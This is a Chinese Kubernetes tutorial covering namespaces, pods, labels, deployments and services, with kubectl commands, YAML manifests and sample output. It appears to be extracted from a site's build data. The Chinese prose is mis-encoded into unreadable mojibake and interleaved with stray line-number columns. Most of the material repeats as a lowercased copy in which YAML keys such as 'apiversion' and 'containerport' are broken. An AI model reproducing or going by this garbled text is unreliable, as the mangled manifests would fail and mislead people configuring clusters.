deleted\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n\n\néç½®æä½\nåå»ºä¸ä¸ª deploy-nginx.yamlï¼åå®¹å¦ä¸ï¼\n\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\n  namespace: dev\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      run: nginx\n  template:\n    metadata:\n      labels:\n        run: nginx\n    spec:\n      containers:\n      - image: nginx:latest\n        name: nginx\n        ports:\n        - containerPort: 80\n          protocol: TCP\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\nç¶åå°±å¯ä»¥æ§è¡å¯¹åºçåå»ºåå é¤å½ä»¤äºï¼\nåå»ºï¼kubectl create -f deploy-nginx.yaml\nå é¤ï¼kubectl delete -f deploy-nginx.yaml\n\n\n# Service\n\nç®åå·²ç»è½å¤å©ç¨ Deployment æ¥åå»ºä¸ç» Pod æ¥æä¾å·æé«å¯ç¨æ§çæå¡ãè½ç¶æ¯ä¸ª Pod é½ä¼åéä¸ä¸ªåç¬ç Pod IPï¼ç¶èå´å­å¨å¦ä¸ä¸¤é®é¢ï¼\n\n * Pod IP ä¼éç Pod çéå»ºäº§çåå\n * Pod IP ä»ä»æ¯éç¾¤åå¯è§çèæ IPï¼å¤é¨æ æ³è®¿é®\n\nè¿æ ·å¯¹äºè®¿é®è¿ä¸ªæå¡å¸¦æ¥äºé¾åº¦ãå æ­¤ï¼kubernetes è®¾è®¡äº Service æ¥è§£å³è¿ä¸ªé®é¢ã\n\nService å¯ä»¥çä½æ¯ä¸ç»åç±» Pod å¯¹å¤çè®¿é®æ¥å£ãåå© Serviceï¼åºç¨å¯ä»¥æ¹ä¾¿å°å®ç°æå¡åç°åè´è½½åè¡¡ã\n\n\n\næä½ä¸ï¼åå»ºéç¾¤åé¨å¯è®¿é®ç Service\n\n# æ´é²Service\n# expose éè¿ deploy æ¥æ¾nginx Podæ´é²\n# name æå®åç§°\n# type æå®ç±»åä¸ºéç¾¤IPï¼åªæéç¾¤åé¨å¯ä»¥è®¿é®ï¼ï¼ç±»åæå¾å¤\n# port æå® service çç«¯å£\n# target-port è½¬åå°ç®æ ç«¯å£\n[root@master ~]# kubectl expose deploy nginx --name=svc-nginx1 --type=ClusterIP --port=80 --target-port=80 -n dev\nservice/svc-nginx1 exposed\n\n# æ¥çservice\n[root@master ~]# kubectl get svc svc-nginx1 -n dev -o wide\nNAME         TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)   AGE     SELECTOR\nsvc-nginx1   ClusterIP   10.109.179.231   <none>        80/TCP    3m51s   run=nginx\n\n# è¿éäº§çäºä¸ä¸ªCLUSTER-IPï¼è¿å°±æ¯serviceçIPï¼å¨Serviceççå½å¨æä¸­ï¼è¿ä¸ªå°åæ¯ä¸ä¼åå¨ç\n# å¯ä»¥éè¿è¿ä¸ªIPè®¿é®å½åserviceå¯¹åºçPOD\n[root@master ~]# curl 10.109.179.231:80\n<!DOCTYPE html>\n<html>\n<head>\n<title>Welcome to nginx!</title>\n</head>\n<body>\n<h1>Welcome to nginx!</h1>\n.......\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\næä½äºï¼åå»ºéç¾¤å¤é¨ä¹å¯è®¿é®ç Service\nä¸é¢åå»ºç Service ç type ç±»åä¸º ClusterIPï¼è¿ä¸ª ip å°ååªç¨éç¾¤åé¨å¯è®¿é®ï¼å¦æéè¦åå»ºå¤é¨ä¹å¯ä»¥è®¿é®ç Serviceï¼éè¦ä¿®æ¹ type ä¸º NodePort\n\n[root@master ~]# kubectl expose deploy nginx --name=svc-nginx2 --type=NodePort --port=80 --target-port=80 -n dev\nservice/svc-nginx2 exposed\n\n# æ­¤æ¶æ¥çï¼ä¼åç°åºç°äºNodePortç±»åçServiceï¼èä¸æä¸å¯¹Portï¼80:31928/TCï¼\n[root@master ~]# kubectl get svc  svc-nginx2  -n dev -o wide\nNAME          TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)        AGE    SELECTOR\nsvc-nginx2    NodePort    10.100.94.0      <none>        80:31928/TCP   9s     run=nginx\n\n# æ¥ä¸æ¥å°±å¯ä»¥éè¿éç¾¤å¤çä¸»æºè®¿é® èç¹IP:31928è®¿é®æå¡äº\n# ä¾å¦å¨ççµèä¸»æºä¸éè¿æµè§å¨è®¿é®ä¸é¢çå°å\nhttp://192.168.5.4:31928/\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\nå é¤ Service\n\n[root@master ~]# kubectl delete svc svc-nginx-1 -n dev service "svc-nginx-1" deleted\n\n\n1\n\n\néç½®æ¹å¼\nåå»ºä¸ä¸ª svc-nginx.yamlï¼åå®¹å¦ä¸ï¼\n\napiVersion: v1\nkind: Service\nmetadata:\n  name: svc-nginx\n  namespace: dev\nspec:\n  # åºå®svcçåç½ipï¼å¦æä¸æå®ä¼éæºåé\n  clusterIP: 10.109.179.231 \n  ports:\n  - port: 80\n    protocol: TCP\n    targetPort: 80\n  selector:\n    run: nginx\n  type: ClusterIP\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\nç¶åå°±å¯ä»¥æ§è¡å¯¹åºçåå»ºåå é¤å½ä»¤äºï¼\nåå»ºï¼kubectl create -f svc-nginx.yaml\nå é¤ï¼kubectl delete -f svc-nginx.yaml',normalizedContent:'# namespace\n\nnamespace æ¯ kubernetes ç³»ç»ä¸­çä¸ç§éå¸¸éè¦èµæºï¼å®çä¸»è¦ä½ç¨æ¯ç¨æ¥å®ç°å¤å¥ç¯å¢çèµæºéç¦»æèå¤ç§æ·çèµæºéç¦»ã\n\né»è®¤æåµä¸ï¼kubernetes éç¾¤ä¸­çææç pod é½æ¯å¯ä»¥ç¸äºè®¿é®çãä½æ¯å¨å®éä¸­ï¼å¯è½ä¸æ³è®©ä¸¤ä¸ª pod ä¹é´è¿è¡äºç¸çè®¿é®ï¼é£æ­¤æ¶å°±å¯ä»¥å°ä¸¤ä¸ª pod ååå°ä¸åç namespace ä¸ãkubernetes éè¿å°éç¾¤åé¨çèµæºåéå°ä¸åç namespace ä¸­ï¼å¯ä»¥å½¢æé»è¾ä¸ç "ç»"ï¼ä»¥æ¹ä¾¿ä¸åçç»çèµæºè¿è¡éç¦»ä½¿ç¨åç®¡çã\n\nå¯ä»¥éè¿ kubernetes çæææºå¶ï¼å°ä¸åç namespace äº¤ç»ä¸åç§æ·è¿è¡ç®¡çï¼è¿æ ·å°±å®ç°äºå¤ç§æ·çèµæºéç¦»ãæ­¤æ¶è¿è½ç»å kubernetes çèµæºéé¢æºå¶ï¼éå®ä¸åç§æ·è½å ç¨çèµæºï¼ä¾å¦ cpu ä½¿ç¨éãåå­ä½¿ç¨éç­ç­ï¼æ¥å®ç°ç§æ·å¯ç¨èµæºçç®¡çã\n\n\n\nkubernetes å¨éç¾¤å¯å¨ä¹åï¼ä¼é»è®¤åå»ºå ä¸ª namespace\n\n[root@master ~]# kubectl  get namespace\nname              status   age\ndefault           active   45h     \nkube-node-lease   active   45h  \nkube-public       active   45h     \nkube-system       active   45h    \n\n\n1\n2\n3\n4\n5\n6\n\n * default æææªæå® namespace çå¯¹è±¡é½ä¼è¢«åéå¨ default å½åç©ºé´\n * kube-node-lease éç¾¤èç¹ä¹é´çå¿è·³ç»´æ¤ï¼v1.13 å¼å§å¼å¥\n * kube-public æ­¤å½åç©ºé´ä¸çèµæºå¯ä»¥è¢«ææäººè®¿é®ï¼åæ¬æªè®¤è¯ç¨æ·ï¼\n * kube-system ææç± kubernetes ç³»ç»åå»ºçèµæºé½å¤äºè¿ä¸ªå½åç©ºé´\n\nä¸é¢æ¥ç namespace èµæºçå·ä½æä½ï¼\næ¥ç\n\n# 1 æ¥çææçns  å½ä»¤ï¼kubectl get ns\n[root@master ~]# kubectl get ns\nname              status   age\ndefault           active   45h\nkube-node-lease   active   45h\nkube-public       active   45h     \nkube-system       active   45h     \n\n# 2 æ¥çæå®çns   å½ä»¤ï¼kubectl get ns nsåç§°\n[root@master ~]# kubectl get ns default\nname      status   age\ndefault   active   45h\n\n# 3 æå®è¾åºæ ¼å¼  å½ä»¤ï¼kubectl get ns nsåç§°  -o æ ¼å¼åæ°\n# kubernetesæ¯æçæ ¼å¼æå¾å¤ï¼æ¯è¾å¸¸è§çæ¯wideãjsonãyaml\n[root@master ~]# kubectl get ns default -o yaml\napiversion: v1\nkind: namespace\nmetadata:\n  creationtimestamp: "2021-05-08t04:44:16z"\n  name: default\n  resourceversion: "151"\n  selflink: /api/v1/namespaces/default\n  uid: 7405f73a-e486-43d4-9db6-145f1409f090\nspec:\n  finalizers:\n  - kubernetes\nstatus:\n  phase: active\n  \n# 4 æ¥çnsè¯¦æ  å½ä»¤ï¼kubectl describe ns nsåç§°\n[root@master ~]# kubectl describe ns default\nname:         default\nlabels:       <none>\nannotations:  <none>\nstatus:       active  # active å½åç©ºé´æ­£å¨ä½¿ç¨ä¸­  terminating æ­£å¨å é¤å½åç©ºé´\n\n# resourcequota éå¯¹namespaceåçèµæºéå¶\n# limitrangeéå¯¹namespaceä¸­çæ¯ä¸ªç»ä»¶åçèµæºéå¶\nno resource quota.\nno limitrange resource.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n\n\nåå»º\n\n# åå»ºnamespace\n[root@master ~]# kubectl create ns dev\nnamespace/dev created\n\n\n1\n2\n3\n\n\nå é¤\n\n# å é¤namespace\n[root@master ~]# kubectl delete ns dev\nnamespace "dev" deleted\n\n\n1\n2\n3\n\n\néç½®æ¹å¼\n\napiversion: v1\nkind: namespace\nmetadata:\n  name: dev\n\n\n1\n2\n3\n4\n\n\nç¶åå°±å¯ä»¥æ§è¡å¯¹åºçåå»ºåå é¤å½ä»¤äºï¼\nåå»ºï¼kubectl create -f ns-dev.yaml\nå é¤ï¼kubectl delete -f ns-dev.yaml\n\n\n# pod\n\npod æ¯ kubernetes éç¾¤è¿è¡ç®¡ççæå°ååï¼ç¨åºè¦è¿è¡å¿é¡»é¨ç½²å¨å®¹å¨ä¸­ï¼èå®¹å¨å¿é¡»å­å¨äº pod ä¸­ãpod å¯ä»¥è®¤ä¸ºæ¯å®¹å¨çå°è£ï¼ä¸ä¸ª pod ä¸­å¯ä»¥å­å¨ä¸ä¸ªæèå¤ä¸ªå®¹å¨ã\n\n\n\nkubernetes å¨éç¾¤å¯å¨ä¹åï¼éç¾¤ä¸­çåä¸ªç»ä»¶ä¹é½æ¯ä»¥ pod æ¹å¼è¿è¡çãå¯ä»¥éè¿ä¸é¢å½ä»¤æ¥çï¼\n\n[root@master ~]# kubectl get pod -n kube-system\nnamespace     name                             ready   status    restarts   age\nkube-system   coredns-6955765f44-68g6v         1/1     running   0          2d1h\nkube-system   coredns-6955765f44-cs5r8         1/1     running   0          2d1h\nkube-system   etcd-master                      1/1     running   0          2d1h\nkube-system   kube-apiserver-master            1/1     running   0          2d1h\nkube-system   kube-controller-manager-master   1/1     running   0          2d1h\nkube-system   kube-flannel-ds-amd64-47r25      1/1     running   0          2d1h\nkube-system   kube-flannel-ds-amd64-ls5lh      1/1     running   0          2d1h\nkube-system   kube-proxy-685tk                 1/1     running   0          2d1h\nkube-system   kube-proxy-87spt                 1/1     running   0          2d1h\nkube-system   kube-scheduler-master            1/1     running   0          2d1h\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nåå»ºå¹¶è¿è¡\nkubernetes æ²¡ææä¾åç¬è¿è¡ pod çå½ä»¤ï¼é½æ¯éè¿ pod æ§å¶å¨æ¥å®ç°ç\n\n# å½ä»¤æ ¼å¼ï¼ kubectl run (podæ§å¶å¨åç§°) [åæ°] \n# --image  æå®podçéå\n# --port   æå®ç«¯å£\n# --namespace  æå®namespace\n[root@master ~]# kubectl run nginx --image=nginx:latest --port=80 --namespace dev \ndeployment.apps/nginx created\n\n\n1\n2\n3\n4\n5\n6\n\n\næ¥ç pod ä¿¡æ¯\n\n# æ¥çpodåºæ¬ä¿¡æ¯\n[root@master ~]# kubectl get pods -n dev\nname    ready   status    restarts   age\nnginx   1/1     running   0          43s\n\n# æ¥çpodçè¯¦ç»ä¿¡æ¯\n[root@master ~]# kubectl describe pod nginx -n dev\nname:         nginx\nnamespace:    dev\npriority:     0\nnode:         node1/192.168.5.4\nstart time:   wed, 08 may 2021 09:29:24 +0800\nlabels:       pod-template-hash=5ff7956ff6\n              run=nginx\nannotations:  <none>\nstatus:       running\nip:           10.244.1.23\nips:\n  ip:           10.244.1.23\ncontrolled by:  replicaset/nginx\ncontainers:\n  nginx:\n    container id:   docker://4c62b8c0648d2512380f4ffa5da2c99d16e05634979973449c98e9b829f6253c\n    image:          nginx:latest\n    image id:       docker-pullable://nginx@sha256:485b610fefec7ff6c463ced9623314a04ed67e3945b9c08d7e53a47f6d108dc7\n    port:           80/tcp\n    host port:      0/tcp\n    state:          running\n      started:      wed, 08 may 2021 09:30:01 +0800\n    ready:          true\n    restart count:  0\n    environment:    <none>\n    mounts:\n      /var/run/secrets/kubernetes.io/serviceaccount from default-token-hwvvw (ro)\nconditions:\n  type              status\n  initialized       true\n  ready             true\n  containersready   true\n  podscheduled      true\nvolumes:\n  default-token-hwvvw:\n    type:        secret (a volume populated by a secret)\n    secretname:  default-token-hwvvw\n    optional:    false\nqos class:       besteffort\nnode-selectors:  <none>\ntolerations:     node.kubernetes.io/not-ready:noexecute for 300s\n                 node.kubernetes.io/unreachable:noexecute for 300s\nevents:\n  type    reason     age        from               message\n  ----    ------     ----       ----               -------\n  normal  scheduled  <unknown>  default-scheduler  successfully assigned dev/nginx-5ff7956ff6-fg2db to node1\n  normal  pulling    4m11s      kubelet, node1     pulling image "nginx:latest"\n  normal  pulled     3m36s      kubelet, node1     successfully pulled image "nginx:latest"\n  normal  created    3m36s      kubelet, node1     created container nginx\n  normal  started    3m36s      kubelet, node1     started container nginx\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n\n\nè®¿é® pod\n\n# è·åpodip\n[root@master ~]# kubectl get pods -n dev -o wide\nname    ready   status    restarts   age    ip             node    ... \nnginx   1/1     running   0          190s   10.244.1.23   node1   ...\n\n#è®¿é®pod\n[root@master ~]# curl http://10.244.1.23:80\n<!doctype html>\n<html>\n<head>\n\t<title>welcome to nginx!</title>\n</head>\n<body>\n\t<p><em>thank you for using nginx.</em></p>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\nå é¤æå® pod\n\n# å é¤æå®pod\n[root@master ~]# kubectl delete pod nginx -n dev\npod "nginx" deleted\n\n# æ­¤æ¶ï¼æ¾ç¤ºå é¤podæåï¼ä½æ¯åæ¥è¯¢ï¼åç°åæ°äº§çäºä¸ä¸ª \n[root@master ~]# kubectl get pods -n dev\nname    ready   status    restarts   age\nnginx   1/1     running   0          21s\n\n# è¿æ¯å ä¸ºå½åpodæ¯ç±podæ§å¶å¨åå»ºçï¼æ§å¶å¨ä¼çæ§podç¶åµï¼ä¸æ¦åç°podæ­»äº¡ï¼ä¼ç«å³éå»º\n# æ­¤æ¶è¦æ³å é¤podï¼å¿é¡»å é¤podæ§å¶å¨\n\n# åæ¥æ¥è¯¢ä¸ä¸å½ånamespaceä¸çpodæ§å¶å¨\n[root@master ~]# kubectl get deploy -n  dev\nname    ready   up-to-date   available   age\nnginx   1/1     1            1           9m7s\n\n# æ¥ä¸æ¥ï¼å é¤æ­¤podpodæ§å¶å¨\n[root@master ~]# kubectl delete deploy nginx -n dev\ndeployment.apps "nginx" deleted\n\n# ç¨ç­çå»ï¼åæ¥è¯¢podï¼åç°podè¢«å é¤äº\n[root@master ~]# kubectl get pods -n dev\nno resources found in dev namespace.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\néç½®æä½\nåå»ºä¸ä¸ª pod-nginx.yamlï¼åå®¹å¦ä¸ï¼\nè¿ç§åå»ºæ¹å¼ä¸ä¼å kubectl run å¨åå»º pod æ¶ä¼åå»º pod æ§å¶å¨ï¼ä»¥ä¸æ¯ä¸ä¼åå»º pod æ§å¶å¨çã\n\napiversion: v1\nkind: pod\nmetadata:\n  name: nginx\n  namespace: dev\nspec:\n  containers:\n  - image: nginx:latest\n    name: pod\n    ports:\n    - name: nginx-port\n      containerport: 80\n      protocol: tcp\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nç¶åå°±å¯ä»¥æ§è¡å¯¹åºçåå»ºåå é¤å½ä»¤äºï¼\nåå»ºï¼kubectl create -f pod-nginx.yaml\nå é¤ï¼kubectl delete -f pod-nginx.yaml\n\n\n# label\n\nlabel æ¯ kubernetes ç³»ç»ä¸­çä¸ä¸ªéè¦æ¦å¿µãå®çä½ç¨å°±æ¯å¨èµæºä¸æ·»å æ è¯ï¼ç¨æ¥å¯¹å®ä»¬è¿è¡åºååéæ©ã\n\nlabel çç¹ç¹ï¼\n\n * ä¸ä¸ª label ä¼ä»¥ key/value é®å¼å¯¹çå½¢å¼éå å°åç§å¯¹è±¡ä¸ï¼å¦ nodeãpodãservice ç­ç­\n * ä¸ä¸ªèµæºå¯¹è±¡å¯ä»¥å®ä¹ä»»ææ°éç label ï¼åä¸ä¸ª label ä¹å¯ä»¥è¢«æ·»å å°ä»»ææ°éçèµæºå¯¹è±¡ä¸å»\n * label éå¸¸å¨èµæºå¯¹è±¡å®ä¹æ¶ç¡®å®ï¼å½ç¶ä¹å¯ä»¥å¨å¯¹è±¡åå»ºåå¨ææ·»å æèå é¤\n\nå¯ä»¥éè¿ label å®ç°èµæºçå¤ç»´åº¦åç»ï¼ä»¥ä¾¿çµæ´»ãæ¹ä¾¿å°è¿è¡èµæºåéãè°åº¦ãéç½®ãé¨ç½²ç­ç®¡çå·¥ä½ã\n\n> ä¸äºå¸¸ç¨ç label ç¤ºä¾å¦ä¸ï¼\n> çæ¬æ ç­¾ï¼"version":"release", "version":"stable"......\n> ç¯å¢æ ç­¾ï¼"environment":"dev"ï¼"environment":"test"ï¼"environment":"pro"\n> æ¶ææ ç­¾ï¼"tier":"frontend"ï¼"tier":"backend"\n\næ ç­¾å®ä¹å®æ¯ä¹åï¼è¿è¦èèå°æ ç­¾çéæ©ï¼è¿å°±è¦ä½¿ç¨å° label selectorï¼å³ï¼\nlabel ç¨äºç»æä¸ªèµæºå¯¹è±¡å®ä¹æ è¯\nlabel selector ç¨äºæ¥è¯¢åç­éæ¥ææäºæ ç­¾çèµæºå¯¹è±¡\n\nå½åæä¸¤ç§ label selectorï¼\n\n * åºäºç­å¼ç label selector\n   name = slave: éæ©ææåå« label ä¸­ key="name" ä¸ value="slave" çå¯¹è±¡\n   env != production: éæ©ææåæ¬ label ä¸­ç key="env" ä¸ value ä¸ç­äº "production" çå¯¹è±¡\n * åºäºéåç label selector\n   name in (master, slave): éæ©ææåå« label ä¸­ç key="name" ä¸ value="master" æ "slave" çå¯¹è±¡\n   name not in (frontend): éæ©ææåå« label ä¸­ç key="name" ä¸ value ä¸ç­äº "frontend" çå¯¹è±¡\n\næ ç­¾çéæ©æ¡ä»¶å¯ä»¥ä½¿ç¨å¤ä¸ªï¼æ­¤æ¶å°å¤ä¸ª label selector è¿è¡ç»åï¼ä½¿ç¨éå· "," è¿è¡åéå³å¯ãä¾å¦ï¼\nname=slaveï¼env!=production\nname not in (frontend)ï¼env!=production\n\nå½ä»¤æ¹å¼\n\n# ä¸ºpodèµæºææ ç­¾\n[root@master ~]# kubectl label pod nginx-pod version=1.0 -n dev\npod/nginx-pod labeled\n\n# ä¸ºpodèµæºæ´æ°æ ç­¾\n[root@master ~]# kubectl label pod nginx-pod version=2.0 -n dev --overwrite\npod/nginx-pod labeled\n\n# æ¥çæ ç­¾\n[root@master ~]# kubectl get pod nginx-pod  -n dev --show-labels\nname        ready   status    restarts   age   labels\nnginx-pod   1/1     running   0          10m   version=2.0\n\n# ç­éæ ç­¾\n[root@master ~]# kubectl get pod -n dev -l version=2.0  --show-labels\nname        ready   status    restarts   age   labels\nnginx-pod   1/1     running   0          17m   version=2.0\n[root@master ~]# kubectl get pod -n dev -l version!=2.0 --show-labels\nno resources found in dev namespace.\n\n#å é¤æ ç­¾\n[root@master ~]# kubectl label pod nginx-pod version- -n dev\npod/nginx-pod labeled\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\néç½®æ¹å¼\n\napiversion: v1\nkind: pod\nmetadata:\n  name: nginx\n  namespace: dev\n  # åå»ºæ¶æ·»å æ ç­¾\n  labels:\n    version: "3.0" \n    env: "test"\nspec:\n  containers:\n  - image: nginx:latest\n    name: pod\n    ports:\n    - name: nginx-port\n      containerport: 80\n      protocol: tcp\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\nç¶åå°±å¯ä»¥æ§è¡å¯¹åºçæ´æ°å½ä»¤äºï¼kubectl apply -f pod-nginx.yaml\n\n\n# deployment\n\nå¨ kubernetes ä¸­ï¼pod æ¯æå°çæ§å¶ååï¼ä½æ¯ kubernetes å¾å°ç´æ¥æ§å¶ podï¼ä¸è¬é½æ¯éè¿ pod æ§å¶å¨æ¥å®æçãpod æ§å¶å¨ç¨äº pod çç®¡çï¼ç¡®ä¿ pod èµæºç¬¦åé¢æçç¶æï¼å½ pod çèµæºåºç°æéæ¶ï¼ä¼å°è¯è¿è¡éå¯æéå»º podã\n\nå¨ kubernetes ä¸­ pod æ§å¶å¨çç§ç±»æå¾å¤ï¼æ¬ç« èåªä»ç»ä¸ç§ï¼deploymentã\n\n\n\nå½ä»¤æä½\n\n# å½ä»¤æ ¼å¼: kubectl run deploymentåç§°  [åæ°] \n# --image  æå®podçéå\n# --port   æå®ç«¯å£\n# --replicas  æå®åå»ºpodæ°é\n# --namespace  æå®namespace\n[root@master ~]# kubectl run nginx --image=nginx:latest --port=80 --replicas=3 -n dev\ndeployment.apps/nginx created\n\n# æ¥çåå»ºçpod\n[root@master ~]# kubectl get pods -n dev\nname                     ready   status    restarts   age\nnginx-5ff7956ff6-6k8cb   1/1     running   0          19s\nnginx-5ff7956ff6-jxfjt   1/1     running   0          19s\nnginx-5ff7956ff6-v6jqw   1/1     running   0          19s\n\n# æ¥çdeploymentçä¿¡æ¯\n[root@master ~]# kubectl get deploy -n dev\nname    ready   up-to-date   available   age\nnginx   3/3     3            3           2m42s\n\n# up-to-dateï¼æååçº§çå¯æ¬æ°é\n# availableï¼å¯ç¨å¯æ¬çæ°é\n[root@master ~]# kubectl get deploy -n dev -o wide\nname    ready up-to-date  available   age     containers   images              selector\nnginx   3/3     3         3           2m51s   nginx        nginx:latest        run=nginx\n\n# æ¥çdeploymentçè¯¦ç»ä¿¡æ¯\n[root@master ~]# kubectl describe deploy nginx -n dev\nname:                   nginx\nnamespace:              dev\ncreationtimestamp:      wed, 08 may 2021 11:14:14 +0800\nlabels:                 run=nginx\nannotations:            deployment.kubernetes.io/revision: 1\nselector:               run=nginx\nreplicas:               3 desired | 3 updated | 3 total | 3 available | 0 unavailable\nstrategytype:           rollingupdate\nminreadyseconds:        0\nrollingupdatestrategy:  25% max unavailable, 25% max surge\npod template:\n  labels:  run=nginx\n  containers:\n   nginx:\n    image:        nginx:latest\n    port:         80/tcp\n    host port:    0/tcp\n    environment:  <none>\n    mounts:       <none>\n  volumes:        <none>\nconditions:\n  type           status  reason\n  ----           ------  ------\n  available      true    minimumreplicasavailable\n  progressing    true    newreplicasetavailable\noldreplicasets:  <none>\nnewreplicaset:   nginx-5ff7956ff6 (3/3 replicas created)\nevents:\n  type    reason             age    from                   message\n  ----    ------             ----   ----                   -------\n  normal  scalingreplicaset  5m43s  deployment-controller  scaled up replicaset nginx-5ff7956ff6 to 3\n  \n# å é¤,å¯¹åºçpodä¹ä¼å é¤\n[root@master ~]# kubectl delete deploy nginx -n dev\ndeployment.apps "nginx" deleted\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n\n\néç½®æä½\nåå»ºä¸ä¸ª deploy-nginx.yamlï¼åå®¹å¦ä¸ï¼\n\napiversion: apps/v1\nkind: deployment\nmetadata:\n  name: nginx\n  namespace: dev\nspec:\n  replicas: 3\n  selector:\n    matchlabels:\n      run: nginx\n  template:\n    metadata:\n      labels:\n        run: nginx\n    spec:\n      containers:\n      - image: nginx:latest\n        name: nginx\n        ports:\n        - containerport: 80\n          protocol: tcp\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\nç¶åå°±å¯ä»¥æ§è¡å¯¹åºçåå»ºåå é¤å½ä»¤äºï¼\nåå»ºï¼kubectl create -f deploy-nginx.yaml\nå é¤ï¼kubectl delete -f deploy-nginx.yaml\n\n\n# service\n\nç®åå·²ç»è½å¤å©ç¨ deployment æ¥åå»ºä¸ç» pod æ¥æä¾å·æé«å¯ç¨æ§çæå¡ãè½ç¶æ¯ä¸ª pod é½ä¼åéä¸ä¸ªåç¬ç pod ipï¼ç¶èå´å­å¨å¦ä¸ä¸¤é®é¢ï¼\n\n * pod ip ä¼éç pod çéå»ºäº§çåå\n * pod ip ä»ä»æ¯éç¾¤åå¯è§çèæ ipï¼å¤é¨æ æ³è®¿é®\n\nè¿æ ·å¯¹äºè®¿é®è¿ä¸ªæå¡å¸¦æ¥äºé¾åº¦ãå æ­¤ï¼kubernetes è®¾è®¡äº service æ¥è§£å³è¿ä¸ªé®é¢ã\n\nservice å¯ä»¥çä½æ¯ä¸ç»åç±» pod å¯¹å¤çè®¿é®æ¥å£ãåå© serviceï¼åºç¨å¯ä»¥æ¹ä¾¿å°å®ç°æå¡åç°åè´è½½åè¡¡ã\n\n\n\næä½ä¸ï¼åå»ºéç¾¤åé¨å¯è®¿é®ç service\n\n# æ´é²service\n# expose éè¿ deploy æ¥æ¾nginx podæ´é²\n# name æå®åç§°\n# type æå®ç±»åä¸ºéç¾¤ipï¼åªæéç¾¤åé¨å¯ä»¥è®¿é®ï¼ï¼ç±»åæå¾å¤\n# port æå® service çç«¯å£\n# target-port è½¬åå°ç®æ ç«¯å£\n[root@master ~]# kubectl expose deploy nginx --name=svc-nginx1 --type=clusterip --port=80 --target-port=80 -n dev\nservice/svc-nginx1 exposed\n\n# æ¥çservice\n[root@master ~]# kubectl get svc svc-nginx1 -n dev -o wide\nname         type        cluster-ip       external-ip   port(s)   age     selector\nsvc-nginx1   clusterip   10.109.179.231   <none>        80/tcp    3m51s   run=nginx\n\n# è¿éäº§çäºä¸ä¸ªcluster-ipï¼è¿å°±æ¯serviceçipï¼å¨serviceççå½å¨æä¸­ï¼è¿ä¸ªå°åæ¯ä¸ä¼åå¨ç\n# å¯ä»¥éè¿è¿ä¸ªipè®¿é®å½åserviceå¯¹åºçpod\n[root@master ~]# curl 10.109.179.231:80\n<!doctype html>\n<html>\n<head>\n<title>welcome to nginx!</title>\n</head>\n<body>\n<h1>welcome to nginx!</h1>\n.......\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\næä½äºï¼åå»ºéç¾¤å¤é¨ä¹å¯è®¿é®ç service\nä¸é¢åå»ºç service ç type ç±»åä¸º clusteripï¼è¿ä¸ª ip å°ååªç¨éç¾¤åé¨å¯è®¿é®ï¼å¦æéè¦åå»ºå¤é¨ä¹å¯ä»¥è®¿é®ç serviceï¼éè¦ä¿®æ¹ type ä¸º nodeport\n\n[root@master ~]# kubectl expose deploy nginx --name=svc-nginx2 --type=nodeport --port=80 --target-port=80 -n dev\nservice/svc-nginx2 exposed\n\n# æ­¤æ¶æ¥çï¼ä¼åç°åºç°äºnodeportç±»åçserviceï¼èä¸æä¸å¯¹portï¼80:31928/tcï¼\n[root@master ~]# kubectl get svc  svc-nginx2  -n dev -o wide\nname          type        cluster-ip       external-ip   port(s)        age    selector\nsvc-nginx2    nodeport    10.100.94.0      <none>        80:31928/tcp   9s     run=nginx\n\n# æ¥ä¸æ¥å°±å¯ä»¥éè¿éç¾¤å¤çä¸»æºè®¿é® èç¹ip:31928è®¿é®æå¡äº\n# 